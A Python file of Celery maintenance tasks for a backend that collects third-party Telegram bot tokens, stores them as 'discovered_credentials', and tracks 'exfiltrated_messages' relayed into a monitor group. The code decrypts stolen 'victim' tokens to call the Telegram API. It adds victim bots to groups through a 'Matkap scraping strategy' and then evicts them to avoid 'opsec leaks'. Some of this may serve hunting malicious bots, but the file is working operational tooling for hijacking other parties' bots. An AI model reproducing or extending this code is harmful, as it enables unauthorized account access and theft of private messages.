import asyncio
import logging
from datetime import UTC

from telegram.error import TelegramError

from app.core.config import settings
from app.core.database import db
from app.workers.celery_app import _run_sync, app
from app.workers.tasks.flow_tasks import _broadcast_logic, async_execute, get_broadcaster

logger = logging.getLogger("audit.tasks")
logger.setLevel(logging.INFO)

# _run_sync is now canonical in celery_app — imported above, local copy removed.


@app.task(name="audit.audit_active_topics")
def audit_active_topics():
    """
    Periodic task to ensure DB state matches Telegram state.
    1. Checks if 'active' credentials have a valid topic.
    2. Verifies topic existence (via Chat Action).
    3. Triggers recovery if topic found deleted/missing.
    """
    return _run_sync(_audit_active_topics_async())


async def _audit_active_topics_async():
    import os
    broadcaster = get_broadcaster()
    await broadcaster.send_log("🛡️ **Audit**: Starting Topic Integrity Check...")

    # Cap to AUDIT_BATCH_SIZE (default 100) — 100 × 0.2s Telegram ping = ~20s minimum.
    # Full sweep advances via a Redis cursor so successive hourly runs cover ALL credentials,
    # not just the first 100 that Postgres happens to return.
    AUDIT_BATCH_SIZE = int(os.getenv("AUDIT_BATCH_SIZE", 100))

    # Cursor: created_at of last-seen credential (ISO string stored in Redis)
    CURSOR_KEY = "audit:topics:cursor"
    try:
        import redis as _redis

        from app.core.config import settings as _s
        _r = _redis.from_url(_s.REDIS_URL, decode_responses=True)
        cursor_val = _r.get(CURSOR_KEY)  # ISO timestamp or None
    except Exception:
        cursor_val = None

    try:
        q = (
            db.table("discovered_credentials")
            .select("id, meta, chat_id, status, created_at")
            .in_("status", ["active", "pending"])
            .order("created_at", desc=False)
            .limit(AUDIT_BATCH_SIZE)
        )
        if cursor_val:
            q = q.gt("created_at", cursor_val)
        response = await async_execute(q)
        creds = response.data or []

        # Advance or reset cursor
        try:
            if creds:
                _r.set(CURSOR_KEY, creds[-1]["created_at"])
            else:
                # End of table — reset cursor for next full sweep
                _r.delete(CURSOR_KEY)
                logger.info("    [Audit] Full sweep complete, cursor reset.")
        except Exception:
            pass

        logger.info(f"    [Audit] Checking {len(creds)} credentials (batch cap: {AUDIT_BATCH_SIZE}, cursor: {cursor_val or 'start'})...")
    except Exception as e:
        logger.error(f"    ❌ [Audit] DB Fetch failed: {e}")
        return f"DB Fetch failed: {e}"

    recovered_count = 0
    missing_topic_count = 0
    checked_count = 0

    group_id = settings.MONITOR_GROUP_ID

    # Single Bot instance for all pings — avoid creating 100 connections per run
    from telegram import Bot
    from telegram.request import HTTPXRequest
    _audit_bot = Bot(
        token=settings.bot_tokens[0],
        request=HTTPXRequest(read_timeout=10.0, write_timeout=10.0),
    )

    for cred in creds:
        cred_id = cred["id"]
        meta = cred.get("meta") or {}
        topic_id = meta.get("topic_id")

        checked_count += 1

        # Case A: Active but NO topic_id in DB — try to find existing topic first
        # to avoid creating duplicate topics on repeated audit cycles.
        if not topic_id:
            logger.warning(f"    ⚠️ [Audit] Cred {cred_id} is ACTIVE but missing topic_id. Recovering...")
            missing_topic_count += 1
            bot_username = meta.get("bot_username", "unknown")
            bot_id = meta.get("bot_id", "0")
            topic_name = f"@{bot_username} / {bot_id}"
            broadcaster = get_broadcaster()
            try:
                recovered_id = await broadcaster.ensure_topic(group_id, topic_name)
                if recovered_id:
                    fresh = await async_execute(
                        db.table("discovered_credentials").select("meta").eq("id", cred_id).single()
                    )
                    fresh_meta = dict((fresh.data or {}).get("meta") or {})
                    fresh_meta["topic_id"] = recovered_id
                    await async_execute(
                        db.table("discovered_credentials").update({"meta": fresh_meta}).eq("id", cred_id)
                    )
                    recovered_count += 1
                    continue
            except Exception as e:
                logger.warning(f"    ⚠️ [Audit] ensure_topic failed for {cred_id}: {e}")
            # Fallback: re-enqueue full enrichment
            from app.workers.tasks.flow_tasks import enrich_credential
            enrich_credential.delay(cred_id)
            continue

        # Case B: Has topic_id, verify it exists on Telegram
        try:
            await _audit_bot.send_chat_action(
                chat_id=group_id,
                message_thread_id=topic_id,
                action="typing"
            )
            await asyncio.sleep(0.2)  # Rate limit

        except TelegramError as e:
            err_str = str(e)
            if "Topic_deleted" in err_str or "message thread not found" in err_str or "TOPIC_DELETED" in err_str:
                logger.error(f"    ❌ [Audit] Topic {topic_id} for {cred_id} is DELETED. Triggering recovery.")

                # Clear invalid topic_id from DB
                meta["topic_id"] = None
                await async_execute(
                    db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id)
                )

                from app.workers.tasks.flow_tasks import enrich_credential
                enrich_credential.delay(cred_id)
                recovered_count += 1
            elif "Flood control" in err_str:
                await asyncio.sleep(5)
            else:
                logger.warning(f"    ⚠️ [Audit] Check failed for {cred_id} (Topic {topic_id}): {e}")
                continue

        # Case C: Message Integrity Check
        try:
            last_msg_db = await async_execute(
                db.table("exfiltrated_messages")
                .select("telegram_msg_id, id")
                .eq("credential_id", cred_id)
                .eq("is_broadcasted", True)
                .order("telegram_msg_id", desc=True)
                .limit(1)
            )

            if last_msg_db.data:
                db_msg_id = last_msg_db.data[0].get("telegram_msg_id")

                from app.services.user_agent_srv import user_agent
                real_last_msg_id = await user_agent.get_last_message_id(group_id, topic_id)

                if real_last_msg_id and real_last_msg_id < db_msg_id:
                    logger.warning(
                        f"    🚨 [Audit] Integrity mismatch for {cred_id}! "
                        f"DB says {db_msg_id}, Telegram says {real_last_msg_id}."
                    )
        except Exception as e:
            logger.error(f"    ⚠️ [Audit] Message integrity check failed: {e}")

    result_msg = (
        f"🛡️ **Audit Finished**:\n"
        f"Checked: {checked_count}\n"
        f"Missing Topics: {missing_topic_count}\n"
        f"Recovered (Deleted): {recovered_count}"
    )
    logger.info(result_msg)
    await broadcaster.send_log(result_msg)
    return result_msg


@app.task(name="system.self_heal")
def system_self_heal():
    """
    Periodic task to reconcile Supabase DB with Telegram.
    1. Heals missing topics for ALL active credentials.
    2. Triggers a full broadcast catch-up.
    """
    return _run_sync(_system_self_heal_async())


async def _system_self_heal_async():
    from datetime import datetime

    broadcaster = get_broadcaster()
    await broadcaster.send_log("🩹 **Self-Heal**: Starting system-wide sync and recovery...")

    # --- Decontaminate credentials whose chat_id was overwritten with the monitor group ID ---
    # This happens when the kickstart flow adds a victim bot to the monitor group and
    # getUpdates returns monitor group messages as the "discovered" chat.
    try:
        # Resolve all forms of the monitor group ID (username + numeric)
        # before querying — MONITOR_GROUP_ID may be "@theprawnhunter" but
        # chat_id in DB is the numeric form (e.g. -1003588166404).
        from app.services.scraper_srv import _resolve_monitor_group_ids_async
        monitor_ids = await _resolve_monitor_group_ids_async()

        if monitor_ids:
            contaminated_ids: list[str] = []
            for mid in monitor_ids:
                try:
                    int(mid)
                except ValueError:
                    continue  # Skip non-numeric monitor IDs (e.g. @username) since chat_id is bigint in DB

                res = await async_execute(
                    db.table("discovered_credentials")
                    .select("id")
                    .eq("chat_id", mid)
                    .neq("source", "multi_chat")
                )
                if res.data:
                    contaminated_ids.extend([r["id"] for r in res.data])
            # Deduplicate in case multiple ID forms matched same rows
            contaminated_ids = list(set(contaminated_ids))
            if contaminated_ids:
                logger.warning(
                    f"    🧹 [Self-Heal] Resetting {len(contaminated_ids)} contaminated credential(s) "
                    f"(chat_id == monitor group)."
                )
                await async_execute(
                    db.table("discovered_credentials")
                    .update({"chat_id": None, "status": "pending"})
                    .in_("id", contaminated_ids)
                )
                # Re-enrich them so they discover their real chats
                from app.workers.tasks.flow_tasks import enrich_credential
                for cid in contaminated_ids:  # F13: was ids_to_reset (NameError from old code)
                    enrich_credential.delay(cid)
                await broadcaster.send_log(
                    f"🧹 **Self-Heal**: Reset {len(contaminated_ids)} contaminated credential(s) → re-enriching."
                )
    except Exception as e:
        logger.error(f"    ❌ [Self-Heal] Decontamination failed: {e}")
    # ---

    try:
        import os
        SELF_HEAL_BATCH = int(os.getenv("SELF_HEAL_BATCH_SIZE", 200))

        # Cursor-based pagination — advances through all active credentials across 6h runs
        # instead of always fetching the same first-N rows (which may never cycle through).
        HEAL_CURSOR_KEY = "self_heal:cursor"
        try:
            import redis as _redis

            from app.core.config import settings as _sh_s
            _rh = _redis.from_url(_sh_s.REDIS_URL, decode_responses=True)
            heal_cursor = _rh.get(HEAL_CURSOR_KEY)
        except Exception:
            heal_cursor = None

        q = (
            db.table("discovered_credentials")
            .select("*")
            .eq("status", "active")
            .order("created_at", desc=False)
            .limit(SELF_HEAL_BATCH)
        )
        if heal_cursor:
            q = q.gt("created_at", heal_cursor)
        response = await async_execute(q)
        credentials = response.data or []

        # Advance or reset cursor
        try:
            if credentials:
                _rh.set(HEAL_CURSOR_KEY, credentials[-1]["created_at"])
            else:
                _rh.delete(HEAL_CURSOR_KEY)
                logger.info("    [Self-Heal] Full sweep complete, cursor reset.")
        except Exception:
            pass
    except Exception as e:
        logger.error(f"    ❌ [Self-Heal] DB Error: {e}")
        return f"DB Error: {e}"

    heal_count = 0
    group_id = settings.MONITOR_GROUP_ID

    for cred in credentials:
        cred_id = cred["id"]
        stale_meta = cred.get("meta") or {}
        topic_id = stale_meta.get("topic_id")

        bot_username = stale_meta.get("bot_username", "unknown")
        bot_id = stale_meta.get("bot_id", "0")
        topic_name = f"@{bot_username} / {bot_id}"

        if not topic_id or topic_id == 0:
            try:
                new_topic_id = await broadcaster.ensure_topic(group_id, topic_name)
                # Re-fetch meta right before write to avoid overwriting concurrent enrichment updates
                fresh = await async_execute(
                    db.table("discovered_credentials").select("meta").eq("id", cred_id).single()
                )
                meta = dict((fresh.data or {}).get("meta") or {})
                meta["topic_id"] = new_topic_id
                meta["healed_at"] = datetime.now(UTC).isoformat()

                await async_execute(
                    db.table("discovered_credentials").update({"meta": meta}).eq("id", cred_id)
                )
                heal_count += 1
            except Exception as e:
                logger.error(f"    ❌ [Self-Heal] Failed to heal {cred_id}: {e}")

    await broadcaster.send_log(f"🏁 **Self-Heal**: Topic healing complete. Repaired {heal_count} records.")

    # --- Rename @unknown topics where bot_username has since been resolved ---
    rename_count = 0
    try:
        import httpx

        from app.core.security import security

        unknown_q = (
            db.table("discovered_credentials")
            .select("id, bot_token, meta")
            .eq("status", "active")
            .limit(100)
        )
        unknown_res = await async_execute(unknown_q)
        for row in (unknown_res.data or []):
            row_meta = row.get("meta") or {}
            row_username = row_meta.get("bot_username")
            row_topic_id = row_meta.get("topic_id")
            row_bot_id = row_meta.get("bot_id")

            if row_username and row_username != "unknown":
                continue
            if not row_topic_id or not row_bot_id:
                continue

            # Try getMe to resolve the real username
            try:
                decrypted_token = security.decrypt(row["bot_token"]).strip()
                async with httpx.AsyncClient(timeout=10.0) as hc:
                    gm_resp = await hc.get(f"https://api.telegram.org/bot{decrypted_token}/getMe")
                    if gm_resp.status_code == 200:
                        resolved = gm_resp.json().get("result", {}).get("username")
                        if resolved:
                            new_name = f"@{resolved} / {row_bot_id}"
                            renamed = await broadcaster.rename_topic(group_id, row_topic_id, new_name)
                            if renamed:
                                row_meta["bot_username"] = resolved
                                await async_execute(
                                    db.table("discovered_credentials")
                                    .update({"meta": row_meta}).eq("id", row["id"])
                                )
                                rename_count += 1
                                logger.info(f"    [Self-Heal] Renamed topic {row_topic_id} → @{resolved}")
            except Exception as e_rename:
                logger.debug(f"    [Self-Heal] Could not resolve/rename for {row['id']}: {e_rename}")
                continue

        if rename_count:
            await broadcaster.send_log(f"🏷️ **Self-Heal**: Renamed {rename_count} @unknown topic(s).")
    except Exception as e_rename_batch:
        logger.warning(f"    [Self-Heal] Rename batch error: {e_rename_batch}")

    try:
        result = await _broadcast_logic()
        return f"Self-Heal finished. Repaired {heal_count}, renamed {rename_count}. Broadcast: {result}"
    except Exception as e:
        return f"Self-Heal finished. Repaired {heal_count}, renamed {rename_count}. Broadcast failed: {e}"


@app.task(name="system.enforce_whitelist")
def enforce_whitelist():
    """
    Periodic task to ensure all whitelisted bots/users are present and admin in the monitor group.
    """
    return _run_sync(_enforce_whitelist_async())


async def _enforce_whitelist_async():
    from app.services.user_agent_srv import user_agent

    broadcaster = get_broadcaster()
    await broadcaster.send_log("🛡️ **Enforce Whitelist**: Checking group membership and admin status...")

    group_id = settings.MONITOR_GROUP_ID
    raw_ids = settings.WHITELISTED_BOT_IDS or ""
    whitelist = [x.strip() for x in raw_ids.split(",") if x.strip()]

    if not whitelist:
        return "No whitelisted IDs configured."

    invited_count = 0
    promoted_count = 0
    already_ok_count = 0
    failed_count = 0

    for identifier in whitelist:
        try:
            member_info = await user_agent.check_membership(group_id, identifier)

            if member_info is None:
                logger.info(f"    🚪 [Enforce] {identifier} not in group. Inviting...")
                success = await user_agent.invite_bot_to_group(identifier, group_id)

                if success:
                    logger.info(f"    ✅ [Enforce] Invited {identifier} to group.")
                    invited_count += 1
                    await asyncio.sleep(2)

                    title = "Hunter Bot" if str(identifier).isdigit() else "Admin"
                    if await user_agent.promote_to_admin(group_id, identifier, title=title):
                        promoted_count += 1
                        logger.info(f"    👑 [Enforce] Promoted {identifier} to admin.")
                    await asyncio.sleep(1)
                else:
                    logger.warning(f"    ❌ [Enforce] Failed to invite {identifier}.")
                    failed_count += 1
            else:
                if not member_info.get("is_admin"):
                    logger.info(f"    ⬆️ [Enforce] {identifier} is member but not admin. Promoting...")
                    title = "Hunter Bot" if str(identifier).isdigit() else "Admin"
                    if await user_agent.promote_to_admin(group_id, identifier, title=title):
                        promoted_count += 1
                        logger.info(f"    👑 [Enforce] Promoted {identifier} to admin.")
                    else:
                        failed_count += 1
                    await asyncio.sleep(1)
                else:
                    already_ok_count += 1

        except Exception as e:
            logger.error(f"    ❌ [Enforce] Error processing {identifier}: {e}")
            failed_count += 1
            continue

    try:
        removed = await user_agent.cleanup_bots(group_id, whitelist_ids=whitelist, only_non_admins=True)
        cleared = await user_agent.clear_removed_users(group_id)
        cleanup_msg = f"🧹 **Bot Cleanup**: Removed {removed} non-admin bots. Cleared {cleared} from removed list."
        logger.info(f"    {cleanup_msg}")
        if removed > 0 or cleared > 0:
            await broadcaster.send_log(cleanup_msg)
    except Exception as e:
        logger.error(f"    ❌ [Enforce] Cleanup error: {e}")

    result = (
        f"🛡️ **Enforce Whitelist Complete**:\n"
        f"✅ Already OK: {already_ok_count}\n"
        f"🚪 Invited: {invited_count}\n"
        f"👑 Promoted: {promoted_count}\n"
        f"❌ Failed: {failed_count}"
    )
    logger.info(result)
    await broadcaster.send_log(result)
    return result


@app.task(name="system.cleanup_general_topic")
def cleanup_general_topic():
    """
    Periodic task to delete old system logs from the General topic.
    Keep the monitor group clean by removing logs older than 12 hours.
    """
    return _run_sync(_cleanup_general_topic_async())


async def _cleanup_general_topic_async():
    from app.services.user_agent_srv import user_agent

    group_id = settings.MONITOR_GROUP_ID
    logger.info("🧹 **General Cleanup**: Starting message pruning...")

    try:
        deleted = await user_agent.delete_old_messages(group_id, age_hours=12, topic_id=None)

        if deleted > 0:
            result_msg = f"🧹 **General Cleanup**: Pruned {deleted} old system messages (>12h)."
            logger.info(f"    {result_msg}")
            return result_msg

        return "No old messages to prune."
    except Exception as e:
        logger.error(f"    ❌ [General Cleanup] Error: {e}")
        return f"Cleanup failed: {e}"


@app.task(name="audit.prune_audit_logs")
def prune_audit_logs():
    """
    Weekly pruning of audit_logs table — deletes entries older than 90 days.

    TOKEN_DECRYPTED events fire on every broadcast run (hundreds/day) so the
    table grows quickly without pruning. 90-day window retains enough history
    for incident investigation without unbounded growth.
    """
    return _run_sync(_prune_audit_logs_async())


async def _prune_audit_logs_async():
    try:
        from datetime import datetime, timedelta
        cutoff = (datetime.now(UTC) - timedelta(days=90)).isoformat()

        # Count before delete for the log message
        count_res = await async_execute(
            db.table("audit_logs")
            .select("id", count="exact")
            .lt("created_at", cutoff)
        )
        to_delete = count_res.count if hasattr(count_res, "count") else 0

        if to_delete == 0:
            logger.info("[AuditPrune] No audit_logs entries older than 90 days.")
            return "Prune: nothing to delete."

        # Supabase REST delete — no LIMIT on deletes so this clears the full batch
        await async_execute(
            db.table("audit_logs")
            .delete()
            .lt("created_at", cutoff)
        )
        msg = f"[AuditPrune] Deleted {to_delete} audit_logs entries older than 90 days."
        logger.info(msg)

        broadcaster = get_broadcaster()
        await broadcaster.send_log(f"🧹 **Audit Prune**: {msg}")
        return msg
    except Exception as e:
        logger.error(f"    ❌ [AuditPrune] Error: {e}")
        return f"Prune failed: {e}"


@app.task(name="audit.cleanup_matkap_bots")
def cleanup_matkap_bots():
    """
    Hourly audit: scan Redis for matkap:pending_cleanup:* sentinel keys.

    Each key represents a victim bot that was invited to the monitor group
    by the Matkap scraping strategy but whose worker died before kicking it out.
    This task finds those lingering bots and removes them to prevent opsec leaks.

    The inviting code writes: matkap:pending_cleanup:{victim_username}:{dest_chat_id}
    with a 3600s TTL as a safety net. This task provides the active eviction path.
    """
    return _run_sync(_cleanup_matkap_bots_async())


async def _cleanup_matkap_bots_async():
    try:
        import redis as _redis_sync

        from app.core.config import settings as _s
        rc = _redis_sync.from_url(_s.REDIS_URL, decode_responses=True)

        keys = rc.keys("matkap:pending_cleanup:*")
        if not keys:
            logger.debug("[MatkapCleanup] No pending cleanup sentinels found.")
            return "No pending Matkap bots."

        from app.services.user_agent_srv import user_agent
        cleaned = 0
        failed = 0

        for key in keys:
            # key format: matkap:pending_cleanup:{victim_username}:{dest_chat_id}
            parts = key.split(":", 4)
            if len(parts) < 5:
                logger.warning(f"[MatkapCleanup] Malformed sentinel key: {key} — deleting")
                rc.delete(key)
                continue

            victim_username = parts[3]
            dest_chat_id_raw = parts[4]
            try:
                dest_chat_id = int(dest_chat_id_raw)
            except ValueError:
                logger.warning(f"[MatkapCleanup] Invalid chat_id in key: {key} — deleting")
                rc.delete(key)
                continue

            logger.info(f"[MatkapCleanup] Evicting lingering bot @{victim_username} from {dest_chat_id}")
            try:
                kicked = await user_agent.kick_bot_from_group(victim_username, dest_chat_id)
                if kicked:
                    rc.delete(key)
                    cleaned += 1
                    logger.info(f"[MatkapCleanup] ✅ Evicted @{victim_username} from {dest_chat_id}")
                else:
                    # Bot may have already left/been kicked — delete key anyway
                    rc.delete(key)
                    cleaned += 1
                    logger.info(f"[MatkapCleanup] ℹ️ @{victim_username} already absent from {dest_chat_id}, key cleared.")
            except Exception as e_kick:
                failed += 1
                logger.error(f"[MatkapCleanup] ❌ Could not evict @{victim_username}: {e_kick}")

        msg = f"[MatkapCleanup] Done: {cleaned} evicted, {failed} failed."
        logger.info(msg)
        if cleaned or failed:
            broadcaster = get_broadcaster()
            await broadcaster.send_log(f"🔒 **Matkap Cleanup**: {msg}")
        return msg

    except Exception as e:
        logger.error(f"    ❌ [MatkapCleanup] Error: {e}")
        return f"Matkap cleanup failed: {e}"


@app.task(name="system.backfill_general_messages")
def backfill_general_messages():
    """
    One-time/on-demand task: re-broadcasts messages that were previously
    dumped into the General topic because their credential had no topic_id
    or had @unknown username at broadcast time.

    How it works:
    1. Finds credentials that NOW have a valid topic_id
    2. Resets is_broadcasted=False for their messages (capped per batch)
    3. Normal broadcast_pending picks them up and sends to the correct topic

    Triggered via /backfill bot command or manually via Celery.
    Safe to run multiple times — skips already-backfilled messages.
    """
    return _run_sync(_backfill_general_messages_async())


async def _backfill_general_messages_async():
    import os
    broadcaster = get_broadcaster()
    await broadcaster.send_log("🔄 **Backfill**: Scanning for messages stuck in General topic...")

    BATCH_SIZE = int(os.getenv("BACKFILL_BATCH_SIZE", 200))

    try:
        # Find active credentials that have a valid topic_id (i.e., they have
        # a proper topic now, so any old messages can be re-routed there)
        creds_res = await async_execute(
            db.table("discovered_credentials")
            .select("id, meta")
            .eq("status", "active")
            .not_.is_("meta", "null")
        )
        creds = creds_res.data or []

        eligible_cred_ids = []
        for c in creds:
            meta = c.get("meta") or {}
            topic_id = meta.get("topic_id")
            if topic_id and topic_id != 1 and topic_id != 0:
                eligible_cred_ids.append(c["id"])

        if not eligible_cred_ids:
            msg = "Backfill: No credentials with valid topics found."
            await broadcaster.send_log(msg)
            return msg

        # Find broadcasted messages for these credentials that haven't been
        # backfilled yet. We add a backfilled_at marker to prevent re-processing.
        reset_count = 0
        for cred_id in eligible_cred_ids:
            msgs_res = await async_execute(
                db.table("exfiltrated_messages")
                .select("id")
                .eq("credential_id", cred_id)
                .eq("is_broadcasted", True)
                .is_("broadcast_claimed_at", "null")
                .limit(BATCH_SIZE - reset_count)
            )
            for m in (msgs_res.data or []):
                await async_execute(
                    db.table("exfiltrated_messages")
                    .update({"is_broadcasted": False})
                    .eq("id", m["id"])
                )
                reset_count += 1
                if reset_count >= BATCH_SIZE:
                    break
            if reset_count >= BATCH_SIZE:
                break

        msg = f"🔄 **Backfill**: Reset {reset_count} messages for re-broadcast to correct topics."
        logger.info(msg)
        await broadcaster.send_log(msg)

        if reset_count > 0:
            from app.workers.tasks.flow_tasks import broadcast_pending
            broadcast_pending.delay()

        return msg

    except Exception as e:
        error_msg = f"❌ **Backfill** failed: {e}"
        logger.error(error_msg)
        await broadcaster.send_log(error_msg)
        return error_msg
